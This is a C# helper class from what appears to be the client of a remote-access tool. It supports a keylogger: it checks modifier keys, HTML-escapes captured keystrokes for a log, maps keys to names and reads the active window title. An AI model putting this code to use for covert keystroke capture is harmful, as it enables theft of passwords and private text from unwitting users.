using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.Helper
{
    public static class KeyloggerHelper
    {
        #region "Extension Methods"
        public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
        {
            return pressedKeys != null &&
                (pressedKeys.Contains(Keys.LControlKey)
                || pressedKeys.Contains(Keys.RControlKey)
                || pressedKeys.Contains(Keys.LMenu)
                || pressedKeys.Contains(Keys.RMenu)
                || pressedKeys.Contains(Keys.LWin)
                || pressedKeys.Contains(Keys.RWin)
                || pressedKeys.Contains(Keys.Control)
                || pressedKeys.Contains(Keys.Alt));
        }

        public static bool IsModifierKey(this Keys key)
        {
            return (key == Keys.LControlKey
                || key == Keys.RControlKey
                || key == Keys.LMenu
                || key == Keys.RMenu
                || key == Keys.LWin
                || key == Keys.RWin
                || key == Keys.Control
                || key == Keys.Alt);
        }

        public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c)
        {
            return pressedKeys.Contains((Keys)char.ToUpper(c));
        }

        public static bool IsExcludedKey(this Keys k)
        {
            // The keys below are excluded. If it is one of the keys below,
            // the KeyPress event will handle these characters. If the keys
            // are not any of those specified below, we can continue.
            return (k >= Keys.A && k <= Keys.Z
                      || k >= Keys.NumPad0 && k <= Keys.Divide
                      || k >= Keys.D0 && k <= Keys.D9
                      || k >= Keys.Oem1 && k <= Keys.OemClear
                      || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                      || k == Keys.CapsLock
                      || k == Keys.Space);
        }
        #endregion

        public static bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        public static string Filter(char key)
        {
            if ((int)key < 32) return string.Empty;

            switch (key)
            {
                case '<':
                    return "&lt;";
                case '>':
                    return "&gt;";
                case '#':
                    return "&#35;";
                case '&':
                    return "&amp;";
                case '"':
                    return "&quot;";
                case '\'':
                    return "&apos;";
                case ' ':
                    return "&nbsp;";
            }
            return key.ToString();
        }

        public static string Filter(string input)
        {
            return input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;").Replace("'", "&apos;");
        }

        public static string GetDisplayName(Keys key, bool altGr = false)
        {
            string name = key.ToString();
            if (name.Contains("ControlKey"))
                return "Control";
            else if (name.Contains("Menu"))
                return "Alt";
            else if (name.Contains("Win"))
                return "Win";
            else if (name.Contains("Shift"))
                return "Shift";
            return name;
        }

        public static string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            ThreadNativeMethods.GetWindowText(ThreadNativeMethods.GetForegroundWindow(), sbTitle,
                sbTitle.Capacity);

            string title = sbTitle.ToString();

            return (!string.IsNullOrEmpty(title)) ? title : null;
        }
    }
}
